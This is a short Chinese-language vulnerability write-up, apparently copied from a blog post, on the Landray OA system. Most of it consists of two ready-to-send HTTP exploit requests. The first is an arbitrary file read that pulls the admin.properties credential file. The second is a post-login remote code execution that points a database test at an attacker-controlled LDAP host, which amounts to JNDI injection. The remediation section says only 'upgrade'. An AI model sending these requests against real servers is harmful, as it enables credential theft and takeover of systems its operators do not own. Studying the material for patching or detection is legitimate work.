### 一 漏洞描述
蓝凌软件全称深圳市蓝凌软件股份有限公司，于2001年在深圳科技园成立。蓝凌是国内知名的大平台OA服务商和国内领先的知识管理解决方案提供商，是专业从事组织的知识化咨询、软件研发、实施、技术服务的国家级高新技术企业，近期(2021-04-15) Landray-OA系统被爆出存任意文件读取漏洞和后台rce

### 二 漏洞利用
```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 192.168.0.101:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40
Accept: */*
Referer: http://192.168.0.101:8080/login.jsp;jsessionid=47794E4D4553DE56348578B560EA7BDD
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=47794E4D4553DE56348578B560EA7BDD
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

var=%7B%22body%22%3A%7B%22file%22%3A%22%2FWEB-INF%2FKmssConfig%2Fadmin.properties%22%7D%7D
```

解密码，登录；后台RCE

```
POST /admin.do HTTP/1.1
Host: 192.168.0.101:8080
Content-Length: 65
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://192.168.0.101:8080
Referer: http://192.168.0.101:8080/admin.do?method=config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=47794E4D4553DE56348578B560EA7BDD
Connection: close

method=testDbConn&datasource=ldap://xxx.xxx.xxx.xxx:1389/xxxxx
```


https://blog.csdn.net/Dalian0/article/details/121119902


### 三 漏洞修复
升级


> 参考链接:   
> https://blog.csdn.net/Dalian0/article/details/121119902
